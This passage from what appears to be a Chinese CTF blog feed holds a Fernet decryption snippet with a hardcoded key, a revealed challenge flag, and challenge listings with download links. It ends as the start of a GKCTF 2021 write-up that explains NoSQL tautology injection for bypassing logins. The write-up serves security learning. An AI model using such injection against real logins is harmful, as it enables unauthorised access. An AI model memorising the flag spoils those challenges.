class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = Fernet.generate_key()  # 生成密钥</span></span><br><span class="line"><span class="comment"># print(key)</span></span><br><span class="line">key = <span class="string">&quot;0smJ2LvvnQonNICFpjOF8CeuOcMIuYLNVbCDucWSVaw=&quot;</span></span><br><span class="line">f = Fernet(key)  <span class="comment"># 使用密钥实例化</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;加密前信息：&#x27;</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># token = f.encrypt(message.encode())</span></span><br><span class="line"><span class="comment"># print(&#x27;加密后信息：&#x27;, token.decode())</span></span><br><span class="line">token = <span class="string">b&#x27;gAAAAABkGeI2QDhD2PlVFV2USJsTO2RxaUESQowz02khRfYI05-AiIFlDuP4HtLShGmGAXgKZ-sS5CXKfWv32mXJFUy7fItWPg==&#x27;</span></span><br><span class="line"></span><br><span class="line">decrypt_message = f.decrypt(token).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;解密后信息：&#x27;</span>, decrypt_message)</span><br></pre></td></tr></table></figure><p><img src="/images/others/image-20230401171310298.png" alt="image-20230401171310298"></p><p>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</p><p><img src="/images/others/image-20230401172512705.png" alt="image-20230401172512705"></p><p>flag:flag{a20cb3c9-141c-41c4-8255-0cd3eb95b681}</p><p>Beyond</p><p>未解答分值 : 500分</p><p>在某个国家级行动中，作为蓝队研判一哥的老张捕获到了一个神秘流量，直觉告诉他这不简单，于是他将这个流量保存了下来，你能协助他发现其中的秘密吗？</p><p><strong>AreYouOK</strong></p><p>在一次神秘行动中，特工老张的手机遭到了破坏，不过好在还有小米手环，组织向他的手环发送了行动指令，你能协助分析其中的秘密吗？flag格式为flag{Battery_Message}</p><p><a href="https://pan.baidu.com/s/1nGvszy3VWD1SKUs3-zwtGw">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/CUe5Gph5">备用下载</a></p><p>lose the key</p><p>未解答分值 : 157分</p><p>题目内容：lose my key，get my like。</p><p><a href="https://pan.baidu.com/s/1lUE0VcUSLnb2zyK4WcxGEQ">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/ZvlmiWMe">备用下载</a></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>nooblog</p><p>未解答分值 : 500分</p><p>I am just a logic noob trying to talk logically.</p><p><a href="https://pan.baidu.com/s/1gxLc9lbq7mpqjD3G8u-1uw">附件下载</a> 提取码（GAME）<a href="https://share.weiyun.com/z7QclIYK">备用下载</a></p><p><img src="/images/others/image-20230401174456161.png" alt="image-20230401174456161"></p><p><img src="/images/others/image-20230401174257354.png" alt="image-20230401174257354"></p><p><img src="/images/others/image-20230401174445075.png" alt="image-20230401174445075"></p><p>1、【提前下载】挑战区一.rar：<a href="https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig">https://pan.baidu.com/s/1js3lac6myNUN1LZ0Fvplig</a> 提取码：GAME md5值：051dbbe806e36d921a579f3a1db16aba 挑战区二.zip：<a href="https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ">https://pan.baidu.com/s/119wfiZlc3yw11qMKZWuylQ</a> 提取码：GAME md5值：c1fff7d2bb8fea7698157267dc16ca0d （解压密码将在比赛时对应题目描述里）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF-2021-hackme</title>
      <link href="/2023/03/29/GKCTF-2021-hackme/"/>
      <url>/2023/03/29/GKCTF-2021-hackme/</url>
      
        <content type="html"><![CDATA[<p>复现地址：<a href="https://buuoj.cn/challenges#[GKCTF%202021]hackme">https://buuoj.cn/challenges#[GKCTF%202021]hackme</a></p><p>直接访问靶机是一个登录界面</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230329165150877.png" alt="image-20230329165150877"></p><p>给了提示：unicode   ,   注意server和其配置文件</p><p>右键查看源代码，可以看到一个注释，<!--doyounosql?-->，这里是三个单词而不是四个，do you nosql？</p><h5 id="什么是-Nosql"><a href="#什么是-Nosql" class="headerlink" title="什么是 Nosql"></a>什么是 Nosql</h5><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”。在现代的计算系统上每天网络上都会产生庞大的数据量。这些数据有很大一部分是由关系数据库管理系统（RDBMS）来处理。 通过应用实践证明，关系模型是非常适合于客户服务器编程，远远超出预期的利益，今天它是结构化数据存储在网络和商务应用的主导技术。</p><p>NoSQL 是一项全新的数据库革命性运动，早期就有人提出，发展至 2009 年趋势越发高涨。NoSQL的拥护者们提倡运用非关系型的数据存储，相对于铺天盖地的关系型数据库运用，这一概念无疑是一种全新的思维的注入。</p><h5 id="什么是-MongoDB"><a href="#什么是-MongoDB" class="headerlink" title="什么是 MongoDB"></a>什么是 MongoDB</h5><p>MongoDB 是当前最流行的 NoSQL 数据库产品之一，由 C++ 语言编写，是一个基于分布式文件存储的数据库。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。MongoDB 是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。</p><p>MongoDB 将数据存储为一个文档，数据结构由键值（key=&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;bohemian&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : <span class="number">19</span>,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Nosql-注入的简介"><a href="#Nosql-注入的简介" class="headerlink" title="Nosql 注入的简介"></a>Nosql 注入的简介</h5><p>NoSQL 注入由于 NoSQL 本身的特性和传统的 SQL 注入有所区别。使用传统的SQL注入，攻击者利用不安全的用户输入来修改或替换应用程序发送到数据库引擎的 SQL 查询语句（或其他SQL语句）。<br>换句话说，SQL 注入使攻击者可以在数据库中 SQL 执行命令。</p><p>与关系数据库不同，NoSQL 数据库不使用通用查询语言。NoSQL 查询语法是特定于产品的，查询是使用应用程序的编程语言编写的：PHP，JavaScript，Python，Java 等。这意味着成功的注入使攻击者不仅可以在数据库中执行命令，而且可以在应用程序本身中执行命令，这可能更加危险。</p><ul><li><strong>重言式注入</strong></li></ul><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p><p>默认用户输入账号密码后的username password 为这样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bohemian&amp;password=<span class="number">657260</span></span><br></pre></td></tr></table></figure><p>进入 PHP 后的程序数据如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 